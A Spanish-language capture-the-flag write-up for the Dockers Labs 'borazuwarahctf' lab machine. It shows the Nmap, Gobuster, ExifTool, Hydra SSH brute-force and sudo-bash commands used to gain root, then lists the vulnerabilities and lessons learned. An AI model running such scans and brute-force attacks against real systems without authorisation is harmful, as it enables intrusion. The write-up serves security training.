# 🛡️ **Writeup – borazuwarahctf (Dockers Labs)**

Este documento describe el proceso de resolución del desafío **borazuwarahctf** de **Dockers Labs**, mostrando las técnicas utilizadas durante el análisis de la máquina vulnerable hasta obtener acceso completo al sistema.

---

## **1️⃣ Información General**

| **Campo**   | **Información**     |
|-------------|---------------------|
| **Nombre**  | borazuwarahctf      |
| **Dificultad** | Muy Fácil         |
| **IP objetivo** | `172.17.0.2`     |
| **Plataforma** | Dockers Labs      |

### 🎯 **Objetivo**

Analizar la máquina vulnerable utilizando técnicas de **reconocimiento**, **enumeración** y **explotación**, con el fin de obtener acceso al sistema y posteriormente **escalar privilegios al usuario root**.

**Metodología:**

1. Reconocimiento
2. Enumeración
3. Identificación del vector de ataque
4. Explotación
5. Escalada de privilegios

---

## **2️⃣ Reconocimiento**

El objetivo es identificar **puertos abiertos y servicios disponibles** en la máquina objetivo. Para ello, utilizamos **Nmap**:

```bash
nmap -sC -sV -oN escaneoInicial.txt 172.17.0.2
```

📊 **Resultado del escaneo:**

| **Puerto** | **Estado** | **Servicio**   | **Versión**       |
|------------|------------|----------------|-------------------|
| 22/tcp     | Abierto    | SSH            | OpenSSH 9.2p1     |
| 80/tcp     | Abierto    | HTTP (Apache)  | Apache 2.4.59     |

🔎 **Interpretación:**
- **SSH** (Puerto 22): Permite acceso remoto al sistema.
- **HTTP** (Puerto 80): Servidor web Apache.

**Siguiente paso:** Análisis del servicio web en el puerto 80.

---

## **3️⃣ Análisis del Servicio Web**

Al ingresar a `http://172.17.0.2`, se muestra una página simple con una imagen de un huevo Kinder Sorpresa, sin funcionalidades visibles (formularios, panel de login, scripts).

🧠 **Hipótesis:**
- Es posible que existan **metadatos ocultos**, **esteganografía** o archivos/código importantes.

**Herramienta siguiente:** Enumeración web con **Gobuster**.

---

## **4️⃣ Enumeración Web**

Se utiliza **Gobuster** para localizar rutas ocultas:

```bash
gobuster dir -u http://172.17.0.2 \
-w /usr/share/wordlists/dirb/common.txt \
-x php,html,js,txt
```

📊 **Resultados:**

| **Archivo/Directorio** | **Estado** |
|-------------------------|------------|
| `.htaccess`            | 403        |
| `.htpasswd`            | 403        |
| `index.html`           | 200        |
| `server-status`        | 403        |

🔎 **Interpretación:** Aparentemente no hay rutas explotables abiertas excepto `index.html`. La imagen en la página principal puede contener datos sensibles.

**Siguiente paso:** Analizar metadatos de la imagen.

---

## **5️⃣ Análisis de la Imagen**

Se descargó y analizó la imagen con **ExifTool**:

```bash
exiftool imagen.jpeg
```

📊 **Metadatos:**
- **Usuario:** borazuwarah
- **Contraseña:** *****

🔎 **Interpretación:** La imagen expone credenciales críticas. Esto es evidencia de una mala gestión de datos sensibles en archivos públicos.

---

## **6️⃣ Ataque al Servicio SSH**

Con el usuario identificado, se realiza fuerza bruta con **Hydra** para encontrar la contraseña válida:

```bash
hydra -l borazuwarah -P claves.txt ssh://172.17.0.2 -I -f
```

📊 **Resultado:**
- **Usuario:** borazuwarah
- **Contraseña:** 123456

Esto permite autenticarse por SSH:

```bash
ssh borazuwarah@172.17.0.2
```

---

## **7️⃣ Escalada de Privilegios**

Verificamos permisos con:

```bash
sudo -l
```

📊 **Permisos:**
- `ALL (NOPASSWD): /bin/bash`

🚨 **Explotación:**

```bash
sudo bash
whoami
# Resultado: root
```

Con esto, obtenemos acceso completo como usuario `root`.

---

## **8️⃣ Conclusión**

### 🔴 **Vulnerabilidades Identificadas:**

| **Vulnerabilidad**              | **Impacto**                        |
|---------------------------------|------------------------------------|
| Metadatos con credenciales      | Filtración de información crítica |
| Archivos mal configurados       | Exposición de datos sensibles     |
| Permisos inseguros en `sudo`    | Escalada directa a root           |

### 🛠️ **Cadena de Ataque:**
1. Reconocimiento: Nmap
2. Análisis Web: Ruta `/index.html`
3. Análisis de Imagen: Credenciales en metadatos
4. Fuerza Bruta: Hydra SSH
5. Configuración insegura de `sudo`: Acceso root

---

📚 **Lecciones Aprendidas:**

1. Revisar metadatos de archivos antes de publicación.
2. No almacenar credenciales en archivos accesibles.
3. Configurar permisos mínimos para evitar escaladas de privilegios.
4. Implementar revisiones periódicas de configuraciones.

✍️ **Autor:** Raúl Bustamante
🎓 Ingeniería Informática | 🔐 Intereses: Ciberseguridad, Pentesting, CTF.